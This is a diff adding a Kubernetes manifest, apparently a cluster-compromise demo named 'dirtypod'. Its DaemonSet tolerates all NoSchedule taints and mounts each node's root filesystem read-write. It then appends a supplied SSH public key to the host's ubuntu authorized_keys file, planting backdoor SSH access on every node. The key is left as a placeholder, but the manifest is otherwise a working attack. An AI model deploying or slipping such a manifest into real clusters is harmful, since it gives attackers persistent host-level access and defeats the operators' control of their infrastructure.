@@ -1,0 +1,51 @@
+apiVersion: extensions/v1beta1
+kind: DaemonSet
+metadata:
+  labels:
+    run: dirtypod
+  name: dirtypod
+spec:
+  selector:
+    matchLabels:
+      run: dirtypod
+  template:
+    metadata:
+      creationTimestamp: null
+      labels:
+        run: dirtypod
+    spec:
+      tolerations:
+        - operator: Exists
+          effect: NoSchedule
+      serviceAccount: dirtypod
+      containers:
+        - name: busybox
+          image: busybox:1.29.2
+          command: ["/bin/sh"]
+          args: ["-c", "cat /key.pub >> /hostdir/home/ubuntu/.ssh/authorized_keys && echo '' >> /hostdir/home/ubuntu/.ssh/authorized_keys && sleep 10000"]
+          volumeMounts:
+            - mountPath: /hostdir
+              name: hostdir
+              readOnly: false
+            - name: pubkey
+              mountPath: /key.pub
+              subPath: key.pub
+              readOnly: false
+      volumes:
+        - name: hostdir
+          hostPath:
+            path: /
+        - name: pubkey
+          configMap:
+            name: dirtypod-config
+---
+apiVersion: v1
+kind: ConfigMap
+metadata:
+  name: dirtypod-config
+  labels:
+    app: dirtypod
+data:
+  key.pub:
+    INSERT PUBLIC KEY HERE
+
